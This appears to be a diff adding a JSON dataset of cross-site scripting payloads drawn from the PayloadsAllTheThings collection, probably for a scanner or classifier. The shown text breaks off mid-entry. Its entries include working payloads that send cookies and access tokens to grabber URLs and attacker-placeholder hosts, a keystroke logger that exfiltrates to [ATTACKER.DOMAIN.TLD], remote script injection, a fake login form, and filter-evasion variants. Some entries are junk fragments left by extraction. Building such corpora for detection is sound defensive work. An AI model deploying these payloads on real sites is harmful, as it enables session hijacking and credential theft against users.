@@ -1,0 +1,1680 @@
+[
+  {
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>\n  fetch('https://[ATTACKER.DOMAIN.TLD]', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"\n</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>debugger;</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert(1)</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert('XSS')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>ipt>alert('XSS')</scr<script>ipt>\n\"><script>alert('XSS')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>\\u0061lert('22')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>eval('\\x61lert(\\'33\\')')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>confirm(document.domain)</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">\n    alert(document.domain);\n  </script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert('svg desc')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert('svg foreignObject')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert('svg title')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">\n    alert('svg script');\n  </script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert(1)</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert(2)</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>alert(3)</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 1');</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 2');</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://10.10.10.10/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script src=//[ATTACKER.DOMAIN.TLD]></script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointerover=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointerdown=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointerenter=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointerleave=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointermove=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointerout=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<div onpointerup=\"alert(45)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<source onerror=\"javascript:alert(1)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<video src=_ onloadstart=\"alert(1)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<details/open/ontoggle=\"alert`1`\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg/onload='fetch(\"//host/a\").then(r=>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" standalone=\"no\"?>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" standalone=\"no\"?>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<animatetransform onbegin=\"alert('svg animatetransform onbegin')\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:](#wrapper-javascript)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:alert(1)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:prompt(1)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript://%0Aalert(1)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:alert(",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:prompt(document.cookie))",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:window.onerror=alert;throw%201)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "javascript:confirm(",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n\n<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <image xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg\" height=\"200\" width=\"200\"/>\n</svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <use xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning\"/>\n</svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <svg x=\"10\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>\n    <script type=\"text/javascript\">alert('sub-svg 1');</script>\n  </svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<svg x=\"200\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #ED2939\"/>\n    <script type=\"text/javascript\">alert('sub-svg 2');</script>\n  </svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS');>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS')//\n<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS');>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=1 onerror=alert(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=/ onerror=alert(2)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "XSS payload from public repository",
+    "tags": [
+      "xss",
+      "script",
+      "event_handler"
+    ]
+  },
+  {
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>debugger;</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "Better payload replacing `<script>alert(1)</script>`:",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>alert('XSS')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><script>alert('XSS')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>\\u0061lert('22')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>eval('\\x61lert(\\'33\\')')</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\"",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS');>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS')//",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><img src=x onerror=alert('XSS');>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<><img src=1 onerror=alert(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg\fonload=alert(1)>",
+    "category": "xss",
